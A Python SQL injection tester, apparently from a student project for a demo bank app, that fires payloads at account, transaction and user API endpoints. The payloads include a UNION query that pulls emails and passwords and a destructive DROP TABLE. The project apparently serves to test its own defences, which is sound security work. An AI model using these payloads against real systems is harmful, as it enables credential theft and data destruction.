#!/usr/bin/env python3
"""
SQL Injection Test — SEDAD BANK PFE
Usage:
  python sql_injection_test.py --url http://URL_CIBLE
  python sql_injection_test.py --url http://URL_CIBLE --token JWT_TOKEN
"""
import requests
import argparse

PAYLOADS = [
    ("Simple quote",         "'"),
    ("OR always true",       "' OR '1'='1"),
    ("Comment bypass",       "' OR 1=1--"),
    ("UNION 3 cols",         "' UNION SELECT 1,2,3--"),
    ("UNION users",          "' UNION SELECT email,password,3 FROM core_user--"),
    ("DROP TABLE",           "'; DROP TABLE core_user;--"),
    ("Blind true",           "1 AND 1=1"),
    ("Blind false",          "1 AND 1=2"),
    ("Sleep 3s",             "'; SELECT pg_sleep(3);--"),
    ("Stacked queries",      "1; SELECT * FROM core_user--"),
    ("Error based",          "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"),
    ("OR quote bypass",      "admin'/*"),
]

ENDPOINTS = [
    ("GET",  "accounts/"),
    ("GET",  "transactions/"),
    ("GET",  "users/"),
]

def run(base_url: str, token: str):
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    api = base_url.rstrip("/") + "/api"

    print("=" * 65)
    print("  SQL INJECTION TEST — SEDAD BANK PFE")
    print("=" * 65)
    print(f"  Cible : {base_url}")
    print(f"  Auth  : {'JWT fourni' if token else 'Anonyme'}")
    print("=" * 65)

    vulns = 0
    for method, path in ENDPOINTS:
        url = f"{api}/{path}"
        print(f"\n[ENDPOINT] {method} /{path}")
        print("-" * 65)

        for name, payload in PAYLOADS:
            result, extra = _test_payload(method, url, payload, headers)
            tag = "VULNERABLE" if "VULN" in result else "OK"
            print(f"  {name:<26} -> {result}{extra}")
            if tag == "VULNERABLE":
                vulns += 1

    print()
    print("=" * 65)
    print(f"  Résultat : {vulns} vulnérabilités détectées")
    print(f"  SOC      : {base_url.replace(':8000',':3000')}/d/sedad-bank-soc")
    print("=" * 65)

def _test_payload(method, url, payload, headers):
    try:
        if method == "GET":
            r = requests.get(url, params={"search": payload},
                             headers=headers, timeout=6)
        else:
            r = requests.post(url, json={"search": payload},
                              headers=headers, timeout=6)

        if r.status_code == 500:
            return "VULNERABLE (500 Server Error)", ""
        if r.elapsed.total_seconds() > 2.5:
            return "VULNERABLE (Time-based)", f" — {r.elapsed.total_seconds():.1f}s"
        return f"Protege ({r.status_code})", ""

    except requests.exceptions.Timeout:
        return "VULNERABLE (Timeout — injection temporelle)", ""
    except requests.exceptions.ConnectionError:
        return "Hors ligne", ""

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="SQL Injection Test SEDAD BANK — PFE")
    p.add_argument("--url",   default="http://localhost:8000")
    p.add_argument("--token", default="", help="JWT access token")
    args = p.parse_args()
    run(args.url, args.token)
